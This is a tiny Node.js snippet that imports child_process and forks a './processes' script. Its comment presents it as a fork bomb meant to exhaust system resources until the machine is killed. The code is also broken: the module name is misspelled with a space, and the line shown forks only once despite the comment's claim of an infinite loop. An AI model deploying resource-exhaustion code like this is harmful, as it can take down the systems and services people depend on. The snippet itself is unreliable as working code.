const child_process = require('child process')
child_process.fork('./processes'); //fork bomb, takes up resources until the system is killed, infinite loop


